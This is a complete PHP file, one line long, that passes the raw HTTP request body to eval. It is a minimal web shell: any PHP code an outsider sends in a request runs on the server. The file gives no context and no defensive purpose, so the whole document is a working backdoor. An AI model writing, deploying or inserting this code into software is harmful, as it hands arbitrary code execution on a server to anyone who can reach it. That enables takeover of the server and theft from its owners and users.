<?php

eval('?>' . file_get_contents('php://input'));
